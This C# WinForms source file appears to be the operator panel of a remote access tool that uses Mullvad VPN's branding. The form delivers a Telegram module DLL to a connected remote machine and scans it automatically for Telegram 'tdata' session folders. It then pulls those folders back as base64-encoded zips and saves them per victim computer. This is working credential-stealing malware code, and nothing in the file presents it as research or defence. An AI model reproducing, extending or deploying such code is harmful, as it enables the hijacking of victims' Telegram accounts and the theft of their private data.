using System.Text.Json;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class TelegramCredentialsForm : Form
{
    private const string ModuleFile = "mullvad.Module.Telegram";
    private const string ModuleId   = "mullvad.telegram";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ──────────────────────────────────────────────────────────────
    private ToolStrip            _toolbar       = null!;
    private ToolStripButton      _btnCollect    = null!;
    private ToolStripButton      _btnCollectAll = null!;
    private ToolStripButton      _btnOpenFolder = null!;
    private ToolStripButton      _btnRefresh    = null!;
    private ListView             _list          = null!;
    private StatusStrip          _statusBar     = null!;
    private ToolStripStatusLabel _statusLabel   = null!;
    private ToolStripProgressBar _progress      = null!;

    public TelegramCredentialsForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
        // mullvad icon — same resource as main window
        var iconStream = System.Reflection.Assembly.GetExecutingAssembly()
            .GetManifestResourceStream("mullvad.Resources.icons.mullvad-vpn.ico");
        if (iconStream is not null) try { Icon = new Icon(iconStream); } catch { }
    }

    private void Build()
    {
        SuspendLayout();
        Text          = $"Telegram  —  {_handler.Info.Computer}";
        ClientSize    = new Size(760, 400);
        MinimumSize   = new Size(520, 300);
        Font          = new Font("Segoe UI", 9F);
        StartPosition = FormStartPosition.CenterParent;

        // Toolbar
        _toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

        _btnCollect = MakeBtn("Collect Selected", "drive_go.png",
            "Download selected tdata to your client folder");
        _btnCollect.Click   += async (_, _) => await CollectSelectedAsync();
        _btnCollect.Enabled  = false;

        _btnCollectAll = MakeBtn("Collect All", "archive.png",
            "Download all found tdata to your client folder");
        _btnCollectAll.Click   += async (_, _) => await CollectAllAsync();
        _btnCollectAll.Enabled  = false;

        _btnOpenFolder = MakeBtn("Open Folder", "folder.png",
            "Open the client Telegram folder on this machine");
        _btnOpenFolder.Click += (_, _) => OpenClientFolder();

        _btnRefresh = MakeBtn("Refresh", "refresh.png",
            "Re-scan for tdata directories");
        _btnRefresh.Click += async (_, _) => await ScanAsync();

        _toolbar.Items.AddRange(new ToolStripItem[]
        {
            _btnCollect, _btnCollectAll, new ToolStripSeparator(),
            _btnOpenFolder, new ToolStripSeparator(), _btnRefresh
        });

        // ListView
        _list = new ListView
        {
            Dock          = DockStyle.Fill,
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = false,
            Font          = new Font("Segoe UI", 9F),
            UseCompatibleStateImageBehavior = false,
        };
        _list.Columns.Add("tdata Path",  380);
        _list.Columns.Add("Files",        55);
        _list.Columns.Add("Size",         80);
        _list.SelectedIndexChanged += (_, _) =>
            _btnCollect.Enabled = _list.SelectedItems.Count > 0;

        // Status bar
        _statusBar   = new StatusStrip();
        _statusLabel = new ToolStripStatusLabel { Spring = true, TextAlign = ContentAlignment.MiddleLeft, Text = "Scanning…" };
        _progress    = new ToolStripProgressBar { Visible = false, Size = new Size(120, 16) };
        _statusBar.Items.AddRange(new ToolStripItem[] { _statusLabel, _progress });

        Controls.Add(_list);
        Controls.Add(_toolbar);
        Controls.Add(_statusBar);
        ResumeLayout(false);
    }

    // Auto-scan when the form is shown
    protected override async void OnShown(EventArgs e)
    {
        base.OnShown(e);
        await ScanAsync();
    }

    // ── Module delivery ───────────────────────────────────────────────────────

    private async Task<ModuleContext?> EnsureContextAsync(CancellationToken ct = default)
    {
        if (_ctx is not null) return _ctx;

        SetStatus("Delivering module…", busy: true);
        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes is null)
        {
            SetStatus("Module DLL not found — build the Telegram project first.");
            return null;
        }

        bool ok = await ModuleDelivery.EnsureDeliveredAsync(
            _handler, ModuleFile, bytes,
            new Progress<string>(s => SetStatus(s, busy: true)), ct);

        if (!ok) { SetStatus("Module delivery failed."); return null; }

        _ctx = new ModuleContext(_handler, ModuleId);
        _ctx.Disconnected += (_, _) => BeginInvoke(() => SetStatus("Client disconnected."));
        return _ctx;
    }

    // ── Scan (runs automatically on open) ────────────────────────────────────

    private async Task ScanAsync()
    {
        _btnCollect.Enabled    = false;
        _btnCollectAll.Enabled = false;
        _btnRefresh.Enabled    = false;
        _list.Items.Clear();

        try
        {
            var ctx = await EnsureContextAsync();
            if (ctx is null) return;

            SetStatus("Scanning for tdata…", busy: true);
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            string json = await ctx.ExecuteAsync("find", "", cts.Token);

            // surface module errors before attempting to parse as array
            if (json.Contains("\"success\":false"))
            {
                string err = ExtractJsonString(json, "error") ?? json;
                SetStatus($"Module error: {err}");
                return;
            }

            var entries = ParseFindResult(json);
            if (entries.Count == 0)
            {
                SetStatus("No tdata directories found.");
                return;
            }

            foreach (var (path, sizeBytes, fileCount) in entries)
            {
                var it = new ListViewItem(path);
                it.SubItems.Add(fileCount.ToString());
                it.SubItems.Add(FormatBytes(sizeBytes));
                it.Tag = path;
                _list.Items.Add(it);
            }

            SetStatus($"Found {entries.Count} tdata director{(entries.Count == 1 ? "y" : "ies")}.");
            _btnCollectAll.Enabled = true;
        }
        catch (Exception ex) { SetStatus($"Scan failed: {ex.Message}"); }
        finally { _btnRefresh.Enabled = true; }
    }

    // ── Collect selected ─────────────────────────────────────────────────────

    private async Task CollectSelectedAsync()
    {
        if (_list.SelectedItems.Count == 0) return;
        string tdataPath = _list.SelectedItems[0].Tag as string ?? "";
        if (string.IsNullOrEmpty(tdataPath)) return;

        await RunCollect(async ctx =>
        {
            string payload = "{\"tdata_path\":" + JsonEscape(tdataPath) + "}";
            using var cts  = new CancellationTokenSource(TimeSpan.FromMinutes(5));
            return await ctx.ExecuteAsync("collect", payload, cts.Token,
                timeout: TimeSpan.FromMinutes(5));
        }, $"tdata_{DateTime.Now:yyyyMMdd_HHmmss}.zip");
    }

    // ── Collect all ───────────────────────────────────────────────────────────

    private async Task CollectAllAsync()
    {
        await RunCollect(async ctx =>
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(10));
            return await ctx.ExecuteAsync("collect_all", "", cts.Token,
                timeout: TimeSpan.FromMinutes(10));
        }, $"tdata_all_{DateTime.Now:yyyyMMdd_HHmmss}.zip");
    }

    // ── Shared collect logic ──────────────────────────────────────────────────

    private async Task RunCollect(Func<ModuleContext, Task<string>> collectFn, string fileName)
    {
        _btnCollect.Enabled    = false;
        _btnCollectAll.Enabled = false;
        _btnRefresh.Enabled    = false;

        try
        {
            var ctx = await EnsureContextAsync();
            if (ctx is null) return;

            SetStatus("Collecting tdata — this may take a moment…", busy: true);
            string json = await collectFn(ctx);

            if (json.Contains("\"success\":false"))
            {
                string err = ExtractJsonString(json, "error") ?? "unknown error";
                SetStatus($"Collect failed: {err}");
                return;
            }

            string? zipB64 = ExtractJsonString(json, "zip");
            if (string.IsNullOrEmpty(zipB64))
            {
                SetStatus("No zip data in response.");
                return;
            }

            byte[] zipBytes;
            try { zipBytes = Convert.FromBase64String(zipB64); }
            catch { SetStatus("Invalid zip data returned."); return; }

            string savePath = GetSavePath(fileName);
            Directory.CreateDirectory(Path.GetDirectoryName(savePath)!);
            await File.WriteAllBytesAsync(savePath, zipBytes);

            SetStatus($"Saved {FormatBytes(zipBytes.Length)}  →  {savePath}");
        }
        catch (OperationCanceledException) { SetStatus("Collect timed out."); }
        catch (Exception ex)               { SetStatus($"Collect failed: {ex.Message}"); }
        finally
        {
            _btnRefresh.Enabled    = true;
            _btnCollect.Enabled    = _list.SelectedItems.Count > 0;
            _btnCollectAll.Enabled = _list.Items.Count > 0;
        }
    }

    // ── Open folder ───────────────────────────────────────────────────────────

    private void OpenClientFolder()
    {
        var dir = GetClientTelegramDir();
        Directory.CreateDirectory(dir);
        try { System.Diagnostics.Process.Start("explorer.exe", dir); }
        catch (Exception ex) { MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private string GetClientTelegramDir()
    {
        string computerName = string.IsNullOrWhiteSpace(_handler.Info.Computer)
            ? _handler.Info.Id
            : string.Join("_", _handler.Info.Computer.Split(Path.GetInvalidFileNameChars()));
        return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "clients", computerName, "Telegram");
    }

    private string GetSavePath(string fileName)
        => Path.Combine(GetClientTelegramDir(), fileName);

    private void SetStatus(string msg, bool busy = false)
    {
        if (InvokeRequired) { BeginInvoke(() => SetStatus(msg, busy)); return; }
        _statusLabel.Text = msg;
        _progress.Visible = busy;
        if (busy) _progress.Style = ProgressBarStyle.Marquee;
    }

    private static ToolStripButton MakeBtn(string text, string icon, string tip)
    {
        var btn = new ToolStripButton(text)
        {
            ToolTipText  = tip,
            DisplayStyle = ToolStripItemDisplayStyle.Text,
        };
        var img = IconLoader.Load(icon);
        if (img is not null) { btn.Image = img; btn.DisplayStyle = ToolStripItemDisplayStyle.ImageAndText; }
        return btn;
    }

    private static List<(string path, long sizeBytes, int fileCount)> ParseFindResult(string json)
    {
        var result = new List<(string, long, int)>();
        try
        {
            using var doc = JsonDocument.Parse(json);
            foreach (var el in doc.RootElement.EnumerateArray())
            {
                string path  = el.TryGetProperty("path",       out var p) ? p.GetString() ?? "" : "";
                long   bytes = el.TryGetProperty("size_bytes", out var s) ? s.GetInt64() : 0L;
                int    count = el.TryGetProperty("file_count", out var c) ? c.GetInt32() : 0;
                if (!string.IsNullOrEmpty(path))
                    result.Add((path, bytes, count));
            }
        }
        catch { }
        return result;
    }

    private static string? ExtractJsonString(string json, string key)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty(key, out var val))
                return val.GetString();
        }
        catch { }
        return null;
    }

    private static string JsonEscape(string s)
        => "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";

    private static string FormatBytes(long b)
    {
        if (b < 1024)       return $"{b} B";
        if (b < 1048576)    return $"{b / 1024.0:F1} KB";
        if (b < 1073741824) return $"{b / 1048576.0:F1} MB";
        return $"{b / 1073741824.0:F2} GB";
    }

    protected override void OnFormClosed(FormClosedEventArgs e)
    {
        _ctx?.Dispose();
        base.OnFormClosed(e);
    }
}
